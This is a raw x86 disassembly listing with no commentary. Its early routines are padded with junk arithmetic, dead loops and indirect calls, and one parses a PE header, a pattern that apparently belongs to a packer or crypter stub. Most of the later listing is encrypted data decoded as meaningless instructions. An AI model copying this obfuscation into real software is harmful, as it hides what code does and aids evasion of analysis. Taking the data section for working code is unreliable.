  4028ba:	ret    0xc
  4028bd:	push   ebp
  4028be:	mov    ebp,esp
  4028c0:	push   ecx
  4028c1:	and    DWORD PTR ds:0x42d010,0x0
  4028cb:	jmp    0x4028de
  4028d0:	xor    eax,eax
  4028d2:	add    eax,DWORD PTR ds:0x42d010
  4028d8:	inc    eax
  4028d9:	mov    ds:0x42d010,eax
  4028de:	cmp    DWORD PTR ds:0x42d010,0x1c
  4028e5:	jae    0x402908
  4028eb:	cmp    DWORD PTR ds:0x42d010,0x24
  4028f2:	jne    0x402903
  4028f8:	push   0x42c010
  4028fd:	call   DWORD PTR ds:0x42e9ab
  402903:	jmp    0x4028d0
  402908:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40290f:	add    edx,0x297b
  402915:	mov    eax,DWORD PTR [ebp+0x8]
  402918:	movsx  eax,BYTE PTR [eax]
  40291b:	add    edx,edx
  40291d:	mov    edx,0x3272e0
  402922:	sbb    DWORD PTR ds:0x429014,0x3776
  40292c:	sub    eax,edx
  40292e:	mov    ecx,0x7510899
  402933:	xor    DWORD PTR ds:0x429014,0x42b000
  40293d:	xor    eax,ecx
  40293f:	mov    DWORD PTR ds:0x429008,0x73b1
  402949:	cmp    eax,0xf89c85f4
  40294e:	mov    DWORD PTR ds:0x42c014,0x53e4
  402958:	jne    0x402987
  40295e:	mov    eax,DWORD PTR [ebp+0x8]
  402961:	push   esi
  402962:	mov    esi,DWORD PTR [ebp+0x8]
  402965:	add    esi,DWORD PTR [eax+0x3c]
  402968:	mov    DWORD PTR [ebp+0x8],esi
  40296b:	mov    eax,DWORD PTR [ebp-0x4]
  40296e:	mov    esi,DWORD PTR [ebp+0x8]
  402971:	xor    eax,ecx
  402973:	add    eax,edx
  402975:	cmp    DWORD PTR [esi+0x54],eax
  402978:	pop    esi
  402979:	je     0x402987
  40297f:	mov    eax,DWORD PTR [ebp+0x8]
  402982:	jmp    0x40298e
  402987:	mov    eax,DWORD PTR [ebp-0x4]
  40298a:	xor    eax,ecx
  40298c:	add    eax,edx
  40298e:	leave  
  40298f:	ret    0x4
  402992:	push   ebp
  402993:	mov    ebp,esp
  402995:	sub    esp,0x40
  402998:	push   ebx
  402999:	adc    DWORD PTR ds:0x42d000,0x42b014
  4029a3:	push   esi
  4029a4:	push   edi
  4029a5:	lea    eax,[ebp-0x24]
  4029a8:	push   eax
  4029a9:	add    DWORD PTR ds:0x429028,0x429004
  4029b3:	lea    eax,[ebp-0x20]
  4029b6:	push   eax
  4029b7:	xor    DWORD PTR ds:0x42c00c,0x5e29
  4029c1:	call   DWORD PTR ds:0x42e9a7
  4029c7:	sub    DWORD PTR ds:0x42a018,0x7df1
  4029d1:	push   0x21
  4029d3:	push   0x434
  4029d8:	sbb    DWORD PTR ds:0x429000,0x54d2
  4029e2:	push   0x98678765
  4029e7:	sub    DWORD PTR ds:0x42d014,0x42c00c
  4029f1:	call   DWORD PTR ds:0x42e983
  4029f7:	xor    DWORD PTR ds:0x429000,edx
  4029fd:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  402a04:	mov    DWORD PTR [ebp-0xc],0xf89c85b8
  402a0b:	mov    eax,DWORD PTR [ebp-0x4]
  402a0e:	mov    esi,0x7510899
  402a13:	xor    eax,esi
  402a15:	mov    edi,DWORD PTR ds:0x42b01c
  402a1b:	adc    DWORD PTR ds:0x429010,edi
  402a21:	mov    edi,0x3272e0
  402a26:	add    eax,edi
  402a28:	dec    DWORD PTR ds:0x429000
  402a2e:	mov    DWORD PTR [ebp-0x1c],eax
  402a31:	mov    eax,DWORD PTR [ebp+0x14]
  402a34:	adc    DWORD PTR ds:0x42c000,0x42b014
  402a3e:	test   eax,eax
  402a40:	je     0x402a4e
  402a46:	mov    eax,DWORD PTR [ebp+0x14]
  402a49:	mov    eax,DWORD PTR [eax]
  402a4b:	mov    DWORD PTR [ebp-0x1c],eax
  402a4e:	xor    eax,eax
  402a50:	xor    eax,DWORD PTR ds:0x42901c
  402a56:	and    eax,DWORD PTR ds:0x42b000
  402a5c:	mov    ds:0x42901c,eax
  402a61:	mov    eax,DWORD PTR [ebp-0x4]
  402a64:	xor    eax,esi
  402a66:	adc    ebx,DWORD PTR ds:0x429024
  402a6c:	add    eax,edi
  402a6e:	mov    DWORD PTR [ebp-0x8],eax
  402a71:	sbb    ebx,DWORD PTR ds:0x42c008
  402a77:	mov    eax,DWORD PTR [ebp-0xc]
  402a7a:	mov    DWORD PTR ds:0x42b014,0x1d
  402a84:	cmp    DWORD PTR ds:0x42b014,0x0
  402a8b:	je     0x402aca
  402a91:	cmp    DWORD PTR ds:0x42b014,0x20
  402a98:	jne    0x402ab6
  402a9e:	push   0x3b9b
  402aa3:	push   DWORD PTR [ebp-0x24]
  402aa6:	push   0x42d018
  402aab:	push   0x5e20
  402ab0:	call   DWORD PTR ds:0x42e9af
  402ab6:	xor    ebx,ebx
  402ab8:	or     ebx,DWORD PTR ds:0x42b014
  402abe:	dec    ebx
  402abf:	mov    DWORD PTR ds:0x42b014,ebx
  402ac5:	jmp    0x402a84
  402aca:	xor    eax,esi
  402acc:	and    DWORD PTR ds:0x42a01c,0x0
  402ad6:	mov    ebx,DWORD PTR ds:0x42a01c
  402adc:	inc    ebx
  402add:	mov    DWORD PTR ds:0x42a01c,ebx
  402ae3:	cmp    DWORD PTR ds:0x42a01c,0xd
  402aea:	jne    0x402af6
  402af0:	call   DWORD PTR ds:0x42e9b3
  402af6:	cmp    DWORD PTR ds:0x42a01c,0xc
  402afd:	jne    0x402b10
  402b03:	mov    ebx,DWORD PTR ds:0x42a01c
  402b09:	inc    ebx
  402b0a:	mov    DWORD PTR ds:0x42a01c,ebx
  402b10:	cmp    DWORD PTR ds:0x42a01c,0x15
  402b17:	jb     0x402ad6
  402b1d:	or     DWORD PTR ds:0x42c004,edx
  402b23:	add    eax,edi
  402b25:	sub    DWORD PTR ds:0x42b008,ebx
  402b2b:	mov    DWORD PTR [ebp-0x2c],eax
  402b2e:	mov    eax,DWORD PTR [ebp-0x4]
  402b31:	xor    eax,esi
  402b33:	add    eax,edi
  402b35:	dec    ebx
  402b36:	mov    DWORD PTR [ebp-0x38],eax
  402b39:	mov    DWORD PTR ds:0x42a00c,0x11
  402b43:	cmp    DWORD PTR ds:0x42a00c,0x0
  402b4a:	je     0x402bcf
  402b50:	cmp    DWORD PTR ds:0x42a00c,0x1b
  402b57:	jne    0x402b7d
  402b5d:	push   DWORD PTR [ebp-0x28]
  402b60:	push   0x42a000
  402b65:	push   DWORD PTR [ebp-0x24]
  402b68:	push   0x6762
  402b6d:	push   0x632b
  402b72:	push   0x871c
  402b77:	call   DWORD PTR ds:0x42e9b7
  402b7d:	xor    ebx,ebx
  402b7f:	xor    ebx,DWORD PTR ds:0x42a00c
  402b85:	dec    ebx
  402b86:	mov    DWORD PTR ds:0x42a00c,ebx
  402b8c:	jmp    0x402b43
  402b91:	and    DWORD PTR ds:0x42d018,0x0
  402b9b:	xor    eax,eax
  402b9d:	xor    eax,DWORD PTR ds:0x42d018
  402ba3:	inc    eax
  402ba4:	mov    ds:0x42d018,eax
  402ba9:	cmp    DWORD PTR ds:0x42d018,0x2a
  402bb0:	jne    0x402bbc
  402bb6:	call   DWORD PTR ds:0x42e9bb
  402bbc:	cmp    DWORD PTR ds:0x42d018,0x1c
  402bc3:	jb     0x402b9b
  402bc9:	and    ebx,0x7bf
  402bcf:	mov    ebx,DWORD PTR [ebp-0x4]
  402bd2:	xor    ebx,esi
  402bd4:	adc    DWORD PTR ds:0x42d01c,0x429024
  402bde:	add    ebx,edi
  402be0:	xor    DWORD PTR ds:0x42d008,0x22f2
  402bea:	mov    eax,DWORD PTR [ebp-0x2c]
  402bed:	xor    DWORD PTR ds:0x42a008,0x42d00c
  402bf7:	sub    eax,edi
  402bf9:	lea    ecx,[ebx-0x3272e0]
  402bff:	adc    DWORD PTR ds:0x42c01c,0x429010
  402c09:	xor    eax,esi
  402c0b:	xor    ecx,esi
  402c0d:	cmp    ecx,eax
  402c0f:	mov    DWORD PTR ds:0x42a014,0x880
  402c19:	je     0x405220
  402c1f:	and    DWORD PTR ds:0x42d018,0x0
  402c29:	jmp    0x402c3c
  402c2e:	xor    eax,eax
  402c30:	or     eax,DWORD PTR ds:0x42d018
  402c36:	inc    eax
  402c37:	mov    ds:0x42d018,eax
  402c3c:	cmp    DWORD PTR ds:0x42d018,0x1f
  402c43:	jae    0x402c7e
  402c49:	cmp    DWORD PTR ds:0x42d018,0x26
  402c50:	jne    0x402c69
  402c56:	push   0x847e
  402c5b:	push   0x42901c
  402c60:	push   DWORD PTR [ebp-0x20]
  402c63:	call   DWORD PTR ds:0x42e9bf
  402c69:	jmp    0x402c2e
  402c6e:	mov    eax,ds:0x42b010
  402c73:	and    eax,DWORD PTR ds:0x429010
  402c79:	mov    ds:0x42b010,eax
  402c7e:	mov    eax,DWORD PTR [ebp-0x4]
  402c81:	xor    eax,esi
  402c83:	mov    DWORD PTR ds:0x42c008,0x7a4b
  402c8d:	add    eax,edi
  402c8f:	cmp    ebx,eax
  402c91:	mov    DWORD PTR ds:0x42b000,0x3723
  402c9b:	jne    0x405184
  402ca1:	push   DWORD PTR [ebp+0x8]
  402ca4:	neg    DWORD PTR ds:0x42d018
  402caa:	call   0x4028bd
  402caf:	movzx  ecx,BYTE PTR ds:0x42c000
  402cb6:	xor    DWORD PTR ds:0x429000,ecx
  402cbc:	mov    DWORD PTR [ebp-0x14],eax
  402cbf:	sbb    eax,0x7bdb
  402cc4:	mov    eax,DWORD PTR [ebp-0x4]
  402cc7:	mov    ecx,DWORD PTR [ebp-0x14]
  402cca:	sbb    DWORD PTR ds:0x42b00c,0x398d
  402cd4:	xor    eax,esi
  402cd6:	add    eax,edi
  402cd8:	mov    DWORD PTR ds:0x42a018,0x3718
  402ce2:	jmp    0x405039
  402ce7:	dec    ecx
  402ce8:	je     0x402ca4
  402cea:	dec    ebp
  402ceb:	stos   DWORD PTR es:[edi],eax
  402cec:	cmp    ecx,DWORD PTR [ebp+0x6a681074]
  402cf2:	adc    eax,0xa57f4db2
  402cf7:	jp     0x402d73
  402cf9:	jp     0x402d75
  402cfb:	xor    BYTE PTR [edi+0x7a],bl
  402cfe:	jp     0x402d11
  402d00:	sub    BYTE PTR [edi],dl
  402d02:	cmp    eax,0x2f1b2115
  402d07:	popa   
  402d08:	xor    al,0x65
  402d0a:	data16 xor al,0x63
  402d0d:	push   0x6a
  402d0f:	imul   esi,DWORD PTR [edx],0x6cfdd8c1
  402d15:	inc    esp
  402d16:	imul   edi,DWORD PTR [ebp+0x5b],0xffffffac
  402d1a:	jl     0x402d85
  402d1c:	push   ebp
  402d1d:	iret   
  402d1e:	pop    ecx
  402d1f:	dec    edx
  402d20:	cmp    al,0x88
  402d22:	cli    
  402d23:	xchg   DWORD PTR [esi+0x57],esi
  402d26:	dec    ecx
  402d27:	jg     0x402d60
  402d29:	mov    WORD PTR [esi+0x3ba2bc7f],fs
  402d2f:	sub    bh,bh
  402d31:	data16 fdivr st,st(2)
  402d34:	push   ebx
  402d35:	jg     0x402d55
  402d37:	jmp    0xe9faf671
  402d3c:	xchg   DWORD PTR [ebx],edx
  402d3e:	fimul  WORD PTR [ebx-0x54aaf0db]
  402d44:	mov    al,al
  402d46:	imul   DWORD PTR [ecx-0x27]
  402d49:	add    al,dl
  402d4b:	push   cs
  402d4c:	cli    
  402d4d:	es adc al,0x44
  402d50:	or     BYTE PTR [esi],ah
  402d52:	imul   esp,DWORD PTR [ebp+esi*4-0x51],0x13
  402d57:	pop    ebp
  402d58:	add    DWORD PTR [esi+0x2b45e5ff],esp
  402d5e:	jo     0x402d92
  402d60:	les    ebx,FWORD PTR [ebx-0xb]
  402d63:	sbb    bh,dl
  402d65:	je     0x402d24
  402d67:	arpl   cx,bx
  402d69:	xchg   esp,eax
  402d6a:	pop    edi
  402d6b:	mov    edi,DWORD PTR [ebp+0x4d821007]
  402d71:	repz sahf 
  402d73:	cmp    BYTE PTR [edx+0x73],dh
  402d76:	or     ebx,edx
  402d78:	sub    DWORD PTR [edx-0x77],edx
  402d7b:	xor    BYTE PTR [ebx],dh
  402d7d:	push   eax
  402d7e:	jecxz  0x402d4f
  402d80:	mov    ah,BYTE PTR ds:0xc8b7cc85
  402d86:	test   BYTE PTR [ebp-0x20],ch
  402d89:	inc    ecx
  402d8a:	push   edx
  402d8b:	dec    eax
  402d8c:	or     BYTE PTR [esi],bh
  402d8e:	repz add ebp,DWORD PTR ss:[ecx+0x4ca7ca4b]
  402d96:	fadd   QWORD PTR [eax]
  402d98:	push   esi
  402d99:	stc    
  402d9a:	push   edx
  402d9b:	push   esi
  402d9c:	mov    eax,ds:0xf4bf64f5
  402da1:	inc    edx
  402da2:	sbb    ch,BYTE PTR [esi+ebp*4+0x11]
  402da6:	mov    edx,0x17caed75
  402dab:	add    al,0xf3
  402dad:	int3   
  402dae:	jmp    0x43fe17d8
  402db3:	lods   eax,DWORD PTR ss:[esi]
  402db5:	out    0x5e,eax
  402db7:	mov    cs,esi
  402db9:	aas    
  402dba:	add    eax,0x3ee75a27
  402dbf:	ss inc edx
  402dc1:	mov    ch,BYTE PTR [ecx-0x5f]
  402dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dc5:	mov    DWORD PTR [esi-0x20],ecx
  402dc8:	jb     0x402ddc
  402dca:	or     al,0x8a
  402dcc:	loop   0x402db9
  402dce:	icebp  
  402dcf:	scas   eax,DWORD PTR es:[edi]
  402dd0:	push   eax
  402dd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd2:	jb     0x402e49
  402dd4:	mov    bl,0x88
  402dd6:	xchg   ebp,eax
  402dd7:	or     dl,BYTE PTR [edx]
  402dd9:	adc    dh,BYTE PTR [esi+0x77431c8c]
  402ddf:	xchg   ebp,eax
  402de0:	int3   
  402de1:	leave  
  402de2:	outs   dx,DWORD PTR ds:[esi]
  402de3:	dec    edi
  402de4:	pop    DWORD PTR [bx+si]
  402de7:	push   ecx
  402de8:	nop
  402de9:	das    
  402dea:	leave  
  402deb:	dec    esi
  402dec:	jge    0x402dd3
  402dee:	push   ebx
  402def:	scas   al,BYTE PTR es:[edi]
  402df0:	pushf  
  402df1:	jg     0x402e35
  402df3:	or     al,0xb9
  402df5:	inc    eax
  402df6:	pop    esi
  402df7:	aas    
  402df8:	repnz aad 0x75
  402dfb:	fild   QWORD PTR [edi]
  402dfd:	mov    cl,0xb0
  402dff:	ret    0x4ca7
  402e02:	scas   al,BYTE PTR es:[edi]
  402e03:	mov    ch,0x62
  402e05:	stos   DWORD PTR es:[edi],eax
  402e06:	fdivr  st(0),st
  402e08:	jb     0x402e7a
  402e0a:	xchg   edi,eax
  402e0b:	outs   dx,DWORD PTR ds:[esi]
  402e0c:	dec    ecx
  402e0d:	retf   
  402e0e:	sti    
  402e0f:	mov    ebp,0x4f9dbea3
  402e14:	pushf  
  402e15:	push   ds
  402e16:	xchg   ecx,eax
  402e17:	xor    esi,DWORD PTR [edx+0x4b]
  402e1a:	pop    esi
  402e1b:	fcmovbe st,st(3)
  402e1d:	mov    eax,ds:0x71337462
  402e22:	stc    
  402e23:	sub    esi,edx
  402e25:	inc    edi
  402e26:	cmc    
  402e27:	mov    cl,0xf1
  402e29:	jne    0x402e5c
  402e2b:	xlat   BYTE PTR ds:[ebx]
  402e2c:	xor    eax,0xd61d51e7
  402e31:	push   ebp
  402e32:	mov    ah,0x65
  402e34:	push   esi
  402e35:	jge    0x402e7d
  402e37:	xchg   ecx,eax
  402e38:	das    
  402e39:	iret   
  402e3a:	or     DWORD PTR [ecx+0x289e8501],ebp
  402e40:	es or  al,0x55
  402e43:	jmp    0x402eb5
  402e45:	enter  0x2195,0xb
  402e49:	imul   esi,esi,0xffffffc6
  402e4c:	out    0x80,eax
  402e4e:	cli    
  402e4f:	xlat   BYTE PTR ds:[ebx]
  402e50:	push   edx
  402e51:	mov    bh,0xa8
  402e53:	les    edx,FWORD PTR [esi+0x3e13f242]
  402e59:	(bad)  
  402e5a:	fidiv  WORD PTR [edi]
  402e5c:	sbb    eax,edx
  402e5e:	std    
  402e5f:	adc    cl,bh
  402e61:	jo     0x402e0c
  402e63:	mov    ds:0xc836c753,eax
  402e68:	jmp    FWORD PTR [edx]
  402e6a:	mov    ebp,0xcb02ddd5
  402e6f:	int    0xf6
  402e71:	inc    ebp
  402e72:	imul   edi,DWORD PTR [esi-0x3c],0x56
  402e76:	cmc    
  402e77:	lock mov BYTE PTR [esi-0x57],cl
  402e7b:	jbe    0x402e56
  402e7d:	mov    dl,0x62
  402e7f:	js     0x402ec1
  402e81:	loop   0x402efd
  402e83:	ret    0xf1fc
  402e86:	(bad)  
  402e88:	sar    DWORD PTR [esp+ecx*4],cl
  402e8b:	bnd jp 0x402e3d
  402e8e:	lods   al,BYTE PTR ds:[esi]
  402e8f:	call   FWORD PTR [edx]
  402e91:	cmp    BYTE PTR [ebx-0x37bb5acf],0x8e
  402e98:	bswap  ebx
  402e9a:	xchg   al,bh
  402e9c:	cwde   
  402e9d:	sub    esp,DWORD PTR [esi]
  402e9f:	xlat   BYTE PTR ds:[ebx]
  402ea0:	sar    DWORD PTR [ebx],cl
  402ea2:	aaa    
  402ea3:	loope  0x402f21
  402ea5:	inc    ebp
  402ea6:	push   edx
  402ea7:	mov    BYTE PTR [edx-0x71],0x8b
  402eab:	jne    0x402e8a
  402ead:	neg    esi
  402eaf:	or     eax,0xacdcb030
  402eb4:	pop    ds
  402eb5:	ds and al,0x22
  402eb8:	cmp    dh,dh
  402eba:	cdq    
  402ebb:	jne    0x402f0f
  402ebd:	fs retf 0x1acb
  402ec1:	mov    ebp,0xe00b4a20
  402ec6:	rcr    DWORD PTR [eax+eax*8],0x33
  402eca:	dec    esp
  402ecb:	dec    esi
  402ecc:	mov    ch,0x4e
  402ecf:	enter  0xe217,0xfa
  402ed3:	(bad)  
  402ed4:	jle    0x402f17
  402ed6:	and    DWORD PTR [ecx+0x75e8cf5c],0x5a
  402edd:	push   ebp
  402ede:	or     DWORD PTR [ebx],eax
  402ee0:	fist   DWORD PTR [ebx-0x26ebcd41]
  402ee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee7:	xchg   BYTE PTR [ecx+0x41],bl
  402eea:	scas   al,BYTE PTR es:[edi]
  402eeb:	sub    BYTE PTR [ebx+ebx*8+0x5a331369],0x7d
  402ef3:	shl    ah,0xb7
  402ef6:	imul   edi,ebx,0x49
  402ef9:	outs   dx,DWORD PTR ds:[esi]
  402efa:	cmp    DWORD PTR [ebp-0x60],eax
  402efd:	ins    BYTE PTR es:[edi],dx
  402efe:	mov    esp,0xc6a11063
  402f03:	jmp    0x76ba8beb
  402f08:	lods   eax,DWORD PTR ds:[esi]
  402f09:	test   BYTE PTR [ebp-0x2e],bl
  402f0c:	push   ebx
  402f0d:	(bad)  
  402f0e:	in     eax,dx
  402f0f:	loopne 0x402f46
  402f11:	adc    BYTE PTR [ecx+0x12],dl
  402f14:	adc    al,0x6c
  402f16:	add    dh,cl
  402f18:	lods   eax,DWORD PTR ds:[esi]
  402f19:	inc    edx
  402f1a:	pop    ebp
  402f1b:	push   edx
  402f1c:	pop    edi
  402f1d:	adc    ebp,DWORD PTR [ecx-0x76d6a5e4]
  402f23:	adc    DWORD PTR ds:0x4d837d11,eax
  402f29:	xor    al,0x32
  402f2b:	xchg   edi,eax
  402f2c:	js     0x402fac
  402f2e:	inc    ebp
  402f2f:	cmp    eax,0x519c9374
  402f34:	sbb    BYTE PTR [esp-0x4c],bl
  402f38:	sub    al,0xfb
  402f3a:	repnz scas al,BYTE PTR es:[edi]
  402f3c:	adc    al,0x75
  402f3e:	and    eax,0x9695b414
  402f43:	adc    eax,0x9460dadd
  402f48:	jne    0x402faa
  402f4a:	mov    ah,0x93
  402f4c:	push   eax
  402f4d:	out    dx,al
  402f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f4f:	push   eax
  402f50:	imul   ecx,DWORD PTR [ecx+eax*8-0x46],0xfffffff6
  402f55:	pop    ss
  402f56:	sub    al,0x19
  402f58:	sbb    DWORD PTR [edi],edi
  402f5a:	aad    0x9d
  402f5c:	scas   al,BYTE PTR es:[edi]
  402f5d:	push   edi
  402f5e:	dec    edx
  402f5f:	arpl   dx,sp
  402f61:	pop    esp
  402f62:	mov    edx,0xbb242644
  402f67:	jecxz  0x402ef3
  402f69:	sub    esi,DWORD PTR [ecx+0x62]
  402f6c:	xchg   edi,eax
  402f6d:	leave  
  402f6e:	pop    eax
  402f6f:	xchg   ebx,eax
  402f70:	jp     0x402f48
  402f72:	jge    0x402f9b
  402f74:	push   cs
  402f75:	repz and BYTE PTR [ebp-0x1f53a3af],bl
  402f7c:	adc    cl,bh
  402f7e:	mov    edi,DWORD PTR ds:0x63c4d724
  402f84:	pop    ebp
  402f85:	sbb    esp,ebx
  402f87:	sub    al,0x80
  402f89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f8a:	jl     0x40300a
  402f8c:	mov    ah,0x94
  402f8e:	or     esp,DWORD PTR [ecx+0x48]
  402f91:	lahf   
  402f92:	jle    0x402f45
  402f94:	cmp    bh,cl
  402f96:	ds into 
  402f98:	pop    esp
  402f99:	or     ebp,DWORD PTR es:[ebp+edx*8+0x758a4d44]
  402fa1:	mov    esp,0xc9b53a4f
  402fa6:	cmc    
  402fa7:	stos   BYTE PTR es:[edi],al
  402fa8:	mov    ebx,0x83243b6b
  402fad:	inc    ebx
  402faf:	fiadd  WORD PTR ds:0x54c20515
  402fb5:	add    BYTE PTR [ebx+0x63c7072f],ah
  402fbb:	xchg   DWORD PTR [ebx+0x276eea3e],ecx
  402fc1:	cmp    ah,BYTE PTR [esi+0x1]
  402fc4:	sub    DWORD PTR [eax+0x37],eax
  402fc7:	enter  0xd35a,0xdd
  402fcb:	adc    cl,dl
  402fcd:	xor    al,0xe0
  402fcf:	push   eax
  402fd0:	rol    DWORD PTR [ebp+esi*2+0x43],0x9c
  402fd5:	test   DWORD PTR [esi-0x425b2795],ebp
  402fdb:	addr16 push cs
  402fdd:	fldcw  WORD PTR [edx-0x3d45cd79]
  402fe3:	arpl   WORD PTR [eax-0x53357093],si
  402fe9:	sbb    BYTE PTR [edi-0x8848bfd],cl
  402fef:	mov    esi,gs
  402ff1:	fild   QWORD PTR [ebx-0x41]
  402ff4:	aad    0xbc
  402ff6:	pushf  
  402ff7:	leave  
  402ff8:	mov    dh,0x0
  402ffa:	(bad)  
  402ffb:	mov    ebx,0x679c1eb5
  403000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403001:	push   ss
  403002:	stc    
  403003:	cs fstp st(4)
  403006:	jmp    0xd29b3035
  40300b:	bound  ebx,QWORD PTR [ebp+0x742831a6]
  403011:	add    dl,BYTE PTR [ecx-0x4]
  403014:	test   BYTE PTR [ebp+0x56],ch
  403017:	leave  
  403018:	(bad)  
  403019:	popa   
  40301a:	ds mov dl,0x0
  40301d:	mov    cl,0xfb
  40301f:	bound  edx,QWORD PTR [esi+0x45]
  403022:	shl    DWORD PTR [edx+0xd],1
  403025:	xchg   edx,eax
  403026:	pop    eax
  403027:	rcr    BYTE PTR [ebx-0xc9900a8],cl
  40302d:	mov    esp,0xf67aa53e
  403032:	fcom   st(6)
  403034:	lods   al,BYTE PTR ds:[esi]
  403035:	jge    0x403042
  403037:	cmp    esp,eax
  403039:	stc    
  40303a:	call   0x6826:0x34bcf36e
  403041:	or     esp,eax
  403043:	cdq    
  403044:	mov    ds:0xbe40c783,al
  403049:	mov    bh,0x98
  40304b:	test   BYTE PTR [ecx],al
  40304d:	sbb    esp,DWORD PTR [ecx]
  40304f:	fdiv   DWORD PTR [esi-0x2a]
  403052:	sub    BYTE PTR [eax-0x69],cl
  403055:	leave  
  403056:	ins    DWORD PTR es:[edi],dx
  403057:	test   eax,0x6b8f4cfb
  40305c:	jno    0x402ffc
  40305e:	es js  0x4030a3
  403061:	mov    WORD PTR [eax],?
  403063:	sub    ebp,edx
  403065:	pop    esp
  403066:	in     eax,dx
  403067:	stos   BYTE PTR es:[edi],al
  403068:	ret    
  403069:	mov    eax,ds:0xcc17ecf
  40306e:	test   esp,ecx
  403070:	mov    eax,ds:0x332eb99f
  403075:	mov    ds:0xc5deed83,eax
  40307a:	xor    DWORD PTR [ebx-0x6e],ebp
  40307d:	pop    esp
  40307e:	or     BYTE PTR [eax+0xf941547],bl
  403084:	pop    ds
  403085:	pop    ecx
  403086:	mov    gs,WORD PTR [esi]
  403088:	outs   dx,BYTE PTR ds:[esi]
  403089:	xchg   ebx,eax
  40308a:	sar    ebx,cl
  40308c:	add    al,bh
  40308e:	cmp    BYTE PTR ss:[esi],cl
  403091:	ss inc esi
  403093:	dec    ecx
  403094:	(bad)  
  403095:	sub    eax,0x5715e5ea
  40309a:	int3   
  40309b:	mov    dh,0x46
  40309d:	(bad)  
  40309e:	jp     0x403022
  4030a0:	test   al,0x94
  4030a2:	pop    edi
  4030a3:	and    al,0xa7
  4030a5:	mov    ebp,0x9066b6b0
  4030aa:	dec    esp
  4030ab:	aad    0xf8
  4030ad:	inc    ebx
  4030ae:	jbe    0x403089
  4030b0:	pop    ss
  4030b1:	jle    0x4030b4
  4030b3:	out    0xfd,eax
  4030b5:	hlt    
  4030b6:	out    dx,eax
  4030b7:	adc    ebp,DWORD PTR [esi+0x265fc18]
  4030bd:	inc    ecx
  4030be:	les    ebp,FWORD PTR [edx-0x57ab0713]
  4030c4:	fs mov dh,0x48
  4030c7:	out    dx,al
  4030c8:	mov    WORD PTR [esi-0x6ffd52e9],ss
  4030ce:	xchg   esp,eax
  4030cf:	stos   DWORD PTR es:[edi],eax
  4030d0:	popa   
  4030d1:	mov    ebx,0x4cfd465d
  4030d6:	jne    0x4030f2
  4030d8:	jb     0x4030f5
  4030da:	loope  0x403063
  4030dc:	ret    
  4030dd:	mov    edx,0x8c9699c
  4030e2:	sbb    DWORD PTR ds:0x2f8dcb41,ebx
  4030e8:	mov    WORD PTR [ecx],?
  4030ea:	xchg   ebx,eax
  4030eb:	inc    esp
  4030ec:	mov    ebx,0x2e402572
  4030f1:	or     DWORD PTR [edi+0x72],0xffffffb2
  4030f5:	jmp    0xa26e:0x7c5aa771
  4030fc:	or     al,0xbe
  4030fe:	cmp    eax,0x9db4c20d
  403103:	and    ah,BYTE PTR [eax-0x1c]
  403106:	sub    bh,al
  403108:	rcr    BYTE PTR [ebp-0x7a],cl
  40310b:	pushf  
  40310c:	(bad)  [edi+0x76]
  40310f:	pushf  
  403110:	jge    0x403165
  403112:	cmp    eax,0xaaea7f53
  403117:	add    edi,DWORD PTR [edi+ebx*4]
  40311a:	int3   
  40311b:	in     eax,dx
  40311c:	mov    ebp,0xdaf92b59
  403121:	out    0xc5,al
  403123:	les    eax,FWORD PTR [edx-0x73]
  403126:	mov    bh,0x2b
  403128:	test   al,0xef
  40312a:	mov    edx,0xe3f9183a
  40312f:	ret    
  403130:	iret   
  403131:	aam    0xaa
  403133:	fistp  QWORD PTR [edi+eiz*8]
  403136:	mov    ebx,0xc63c920d
  40313b:	sbb    BYTE PTR [edx+0x6918b541],bl
  403141:	xchg   ebx,eax
  403142:	bound  edi,QWORD PTR ss:[eax-0x5d454ee3]
  403149:	xor    eax,0xf4e7d3dd
  40314e:	scas   eax,DWORD PTR es:[edi]
  40314f:	xor    BYTE PTR [edi],cl
  403151:	aam    0xcc
  403153:	scas   al,BYTE PTR es:[edi]
  403154:	push   esi
  403155:	mov    al,ds:0x61e976f6
  40315a:	add    esp,0x65e3b6fd
  403160:	pop    esi
  403161:	adc    ebx,eax
  403163:	movzx  edi,al
  403166:	lock dec ecx
  403168:	mov    edx,DWORD PTR [ebx+esi*1-0x30]
  40316c:	xlat   BYTE PTR ds:[ebx]
  40316d:	dec    ebp
  40316e:	pop    esi
  40316f:	cld    
  403170:	xchg   esp,edx
  403172:	retf   0x2115
  403175:	fdiv   DWORD PTR es:[ebx]
  403178:	outs   dx,BYTE PTR ds:[esi]
  403179:	mov    bh,0x4c
  40317b:	and    DWORD PTR [eax],0xffffff83
  40317e:	stos   DWORD PTR es:[edi],eax
  40317f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403180:	(bad)  
  403181:	out    dx,eax
  403182:	and    cl,ah
  403184:	popf   
  403185:	(bad)  ds:0xa21abd05
  40318b:	outs   dx,BYTE PTR ds:[esi]
  40318c:	fnstenv [eax+0x7251a0a9]
  403192:	add    al,0xa4
  403194:	lods   al,BYTE PTR ds:[esi]
  403195:	xor    eax,0xc9d690fd
  40319a:	sahf   
  40319b:	lahf   
  40319c:	adc    ebx,DWORD PTR cs:[edx+esi*1+0x3fe1d032]
  4031a4:	adc    BYTE PTR [esi],dh
  4031a6:	mov    al,0x9f
  4031a8:	out    dx,eax
  4031a9:	out    dx,al
  4031aa:	push   esi
  4031ab:	dec    edi
  4031ac:	faddp  st(5),st
  4031ae:	jnp    0x403160
  4031b0:	add    DWORD PTR [ecx+0x1962b435],0xffffffe3
  4031b7:	mov    esp,0xb2fd005e
  4031bc:	shl    ecx,1
  4031be:	stc    
  4031bf:	imul   esp,DWORD PTR [eax+0x76],0x50ef9e04
  4031c6:	fisttp DWORD PTR [edi]
  4031c8:	pop    esi
  4031c9:	xor    bh,dl
  4031cb:	sub    BYTE PTR [eax+ecx*4+0x5],ah
  4031cf:	adc    BYTE PTR [ebp+eiz*8-0x68ccf254],dh
  4031d6:	imul   BYTE PTR [ecx+edx*1+0x1f]
  4031da:	inc    eax
  4031db:	(bad)  
  4031dc:	dec    ebp
  4031dd:	add    eax,0x121d70d2
  4031e2:	cmp    al,0xf8
